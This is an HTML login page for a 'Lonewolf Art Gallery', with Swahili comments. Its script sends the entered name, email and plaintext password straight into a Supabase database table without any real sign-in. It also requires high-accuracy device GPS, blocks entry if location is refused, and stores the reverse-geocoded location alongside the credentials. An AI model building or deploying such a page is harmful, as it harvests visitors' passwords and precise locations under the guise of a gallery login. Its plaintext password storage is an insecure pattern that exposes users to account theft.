<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LONEWOLF ART GALLERY</title>
    
    <!-- SUPABASE JS LIBRARY -->
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

    <style>
        /* Styles za msingi za ukurasa mzima */
        body {
            background-color: #121212;
            color: #ffffff;
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 20px;
        }

        .logo-img {
            max-width: 250px;
            border-radius: 50%;
            border: 3px solid #d4af37;
            margin: 20px 0;
        }

        h1 {
            color: #d4af37;
            letter-spacing: 2px;
        }

        .login-box {
            background-color: #1e1e1e;
            max-width: 350px;
            margin: 0 auto;
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
        }

        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }

        .input-group label {
            display: block;
            margin-bottom: 5px;
            font-size: 14px;
            color: #ccc;
        }

        .input-group input {
            width: 100%;
            padding: 10px;
            border-radius: 6px;
            border: 1px solid #444;
            background-color: #2a2a2a;
            color: #fff;
            box-sizing: border-box;
        }

        .btn-enter {
            width: 100%;
            background-color: #d4af37;
            color: #121212;
            padding: 12px;
            border: none;
            border-radius: 6px;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
        }

        .btn-enter:hover {
            background-color: #b38f2d;
        }

        #status-msg {
            margin-top: 10px;
            font-size: 14px;
            font-weight: bold;
        }

        footer {
            margin-top: 30px;
            font-size: 12px;
            color: #777;
        }
    </style>
</head>
<body>

    <h1>LONEWOLF ART GALLERY</h1>
    
    <img src="logo.jpg" alt="Lonewolf Logo" class="logo-img">

    <div class="login-box">
        <form id="loginForm">
            <div class="input-group">
                <label>JINA (NAME)</label>
                <input type="text" id="userName" placeholder="Andika jina lako" required>
            </div>

            <div class="input-group">
                <label>BARUA PEPE (EMAIL)</label>
                <input type="email" id="userEmail" placeholder="mfano@gmail.com" required>
            </div>

            <div class="input-group">
                <label>NYENOSIRI (PASSWORD)</label>
                <input type="password" id="userPassword" placeholder="******" required>
            </div>

            <button type="submit" id="submitBtn" class="btn-enter">Enter</button>
        </form>
        <div id="status-msg"></div>
    </div>

    <footer>
        <p>&copy; 2026 Lonewolf Art Gallery. All rights reserved.</p>
    </footer>

    <script>
        // SUPABASE CONFIGURATION
        const SUPABASE_URL = 'https://uywloserbehvqzaezcjs.supabase.co';
        const SUPABASE_KEY = 'sb_publishable_86S_JV6gy_AOpUxhlFd_ow_AhW5xj6a';
        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

        const loginForm = document.getElementById('loginForm');
        const submitBtn = document.getElementById('submitBtn');
        const statusMsg = document.getElementById('status-msg');

        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();

            const fullName = document.getElementById('userName').value.trim();
            const email = document.getElementById('userEmail').value.trim();
            const password = document.getElementById('userPassword').value.trim();

            submitBtn.innerText = "Tafadhali subiri...";
            submitBtn.disabled = true;
            statusMsg.style.color = "#d4af37";
            statusMsg.innerText = "Inasoma GPS ya kifaa chako...";

            let clientLocation = "Tanzania (GPS Unknown)";
            let clientIP = "GPS Active Device";

            // Tumia GPS ya Kifaa (Geolocation API)
            try {
                const position = await new Promise((resolve, reject) => {
                    if (!navigator.geolocation) {
                        reject(new Error("Geolocation haitumiki kwenye kivinjari hiki."));
                    } else {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 15000,
                            maximumAge: 0
                        });
                    }
                });

                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                clientLocation = `Lat: ${lat.toFixed(4)}, Lon: ${lon.toFixed(4)}`;

                // Jaribu kupata jina la eneo kupitia kuratibu za GPS (Reverse Geocoding)
                try {
                    const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                    if (geoRes.ok) {
                        const geoData = await geoRes.json();
                        if (geoData && geoData.address) {
                            const city = geoData.address.city || geoData.address.town || geoData.address.village || 'Eneo Linalojulikana';
                            const country = geoData.address.country || 'Tanzania';
                            clientLocation = `${city}, ${country} (Lat: ${lat.toFixed(4)}, Lon: ${lon.toFixed(4)})`;
                        }
                    }
                } catch (revErr) {
                    console.warn("Imeshindikana kuchota jina la eneo kwa maandishi, inatumia namba za GPS pekee.");
                }

            } catch (geoErr) {
                console.error("Hitilafu ya GPS:", geoErr.message);
                statusMsg.style.color = "#ff4d4d";
                statusMsg.innerText = "Ruhusa ya GPS imekataliwa au haipatikani. Tafadhali ruhusu ili uendelee.";
                submitBtn.innerText = "Enter";
                submitBtn.disabled = false;
                return; // Simamisha usombaji wa fomu ikiwa mtumiaji amekataa au GPS haipatikani
            }

            try {
                // Hifadhi taarifa pamoja na GPS Location kwenye database ya Supabase
                const { data, error } = await supabaseClient
                    .from('users')
                    .insert([
                        { 
                            full_name: fullName, 
                            email: email, 
                            password: password,
                            ip_address: clientIP,
                            location: clientLocation
                        }
                    ]);

                if (error) throw error;

                statusMsg.style.color = "#25D366";
                statusMsg.innerText = "Umefanikiwa! Inakuelekeza kwenye gallery...";

                setTimeout(() => {
                    window.location.href = "jarib.html";
                }, 1000);

            } catch (err) {
                console.error("Error signing up:", err);
                statusMsg.style.color = "#ff4d4d";
                statusMsg.innerText = "Kuna tatizo limetokea. Jaribu tena.";
                submitBtn.innerText = "Enter";
                submitBtn.disabled = false;
            }
        });
    </script>

</body>
</html>
